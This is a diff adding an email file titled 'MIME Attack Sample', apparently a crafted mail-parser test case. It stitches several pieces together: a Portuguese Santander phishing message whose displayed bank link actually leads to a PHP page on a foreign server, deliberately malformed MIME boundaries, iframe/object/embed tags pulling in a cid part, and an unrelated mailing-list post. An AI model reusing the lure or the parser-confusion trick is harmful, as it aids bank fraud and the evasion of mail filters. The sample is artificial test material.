@@ -1,0 +1,136 @@
+From: wramsey@internet-fx.com
+To: michael.burke@enron.com, stanley.horton@enron.com, susan.ralph@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+  =
+
+  Prezado cliente, jose@monkey.org
+ =
+
+ O Banco Santander tem uma mensagem muito importante para voc=EA!
+ O Santander Brasil inicia a =FAltima etapa do processo de integra=E7=E3o c=
+om o Banco Real, usando o melhor sistema tecnol=F3gico com o que h=E1 de ma=
+is moderno e seguro para melhor atender voc=EA, nosso cliente. =
+
+ Pensando em diminuir os transtornos por conta dos novos n=FAmeros de sua c=
+onta e da implanta=E7=E3o de senhas, o Santander disponibilizou um canal fe=
+ito para voc=EA atualizar seus dados e instalar o M=F3dulo de Prote=E7=E3o. =
+
+ Este canal =E9 exclusivo para voc=EA, n=E3o compartilhe-o pois ele =E9 =FA=
+nico e intransferivel. =
+
+ Acesse-o aqui: =
+
+ =
+
+ http://www.santander.com.br/integracao/bancoreal/20110302
+ Atenciosamente, =
+
+ Marcial Angel Portela Alvarez
+ Vice-Presidente do Grupo Santander Brasil. =
+
+	 =
+
+   =
+
+ 	 =
+
+ =20
+--===============1283365492==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8" />
+<table bordercolor=3Dblack align=3Dleft width=3D432 background=3D"http://im=
+ages.orkut.com/orkut/photos/OgAAAKVGPBG9PPa6U-A-8AEwfz2k-o7TbqkTMH4MkbRVp05=
+L0fR8M3nmbwKz30j2NpxGwFd1UB8fKbkJSSbdIJzOJjsAm1T1ULKmJ0PtDb_pwYPZFd4if4Zave=
+Vg.jpg" height=3D"605">
+<tr>
+<td width=3D"424" height=3D"599"><table width=3D"417">
+  <tr>
+    <td><p align=3D"left"><font color=3D"#000000" size=3D"2" face=3D"Georgi=
+a, Times New Roman, Times, serif">Prezado cliente, jose@monkey.org<br>
+            <br />
+      O Banco Santander tem uma mensagem muito importante para voc=EA!<br />
+      O Santander Brasil inicia a =FAltima etapa do processo de integra=E7=
+=E3o com o Banco Real, usando o melhor sistema   tecnol=F3gico com o que h=
+=E1 de mais moderno e seguro para melhor atender voc=EA,   nosso cliente. <=
+br />
+      Pensando em diminuir os transtornos por conta dos novos n=FAmeros de =
+sua conta e da implanta=E7=E3o de   senhas, o Santander disponibilizou um c=
+anal feito para voc=EA atualizar seus   dados e instalar o M=F3dulo de Prot=
+e=E7=E3o. <br />
+      Este canal =E9 exclusivo para voc=EA, n=E3o   compartilhe-o pois ele =
+=E9 =FAnico e intransferivel. <br />
+      Acesse-o&nbsp;aqui: </font><br>
+      <br />
+      <a href=3D"http://serveurs-paris.com/components/com_kunena/kunena.fil=
+es.distribution/editor/gruposantander.php">http://www.santander.com.br/inte=
+gracao/bancoreal/20110302</a></a></p>
+      <p align=3D"justify"><font size=3D"2">Atenciosamente, <br>
+                Marcial Angel Portela Alvarez<br />
+        Vice-Presidente do Grupo Santander Brasil. </font></p></td>
+  </tr>
+</table>  <p align=3D"left">&nbsp;</p>
+</td>
+</tr>
+</table>=20
+--===============1283365492==--
+------31067840_060105_1300218635189--
+
+------56032_060105_1300221692627--
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+On Fri, Jun 22, 2007 at 12:07:26AM -0500, Farhan wrote:
+> I have an hp compaq nx6325 laptop, and it has no problems as of yet.
+> I do hate the compaq desktops though, and on a related linux note apparently the laptop has acpi problems and makes the fan mess up so the cpu getts up to 167 f. This is probably why I haven't even tryed putting any linux distro on it.
+
+As far as I know, though I haven't had personal experience with them,
+the hp/compaq machines made after the two merged, aren't of bad
+quality. It's the pre-merge compaqs that are garbage. I don't even
+know if your laptop
+is from before the merge, or after.
+
+Greg
+
+
+- -- 
+web site: http://www.romuald.net.eu.org
+gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+skype: gregn1
+(authorization required, add me to your contacts list first)
+
+- --
+Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGe2l/7s9z/XlyUyARAhlAAKCFb0YCFJq7xHuoRkSjdNCqL5ZS5gCgq+DQ
+ooPUJoC2J0Rmg/xktW59fqE=
+=0Uga
+-----END PGP SIGNATURE-----
+
+____
+--BOUNDARY--
+--DELIMITER--
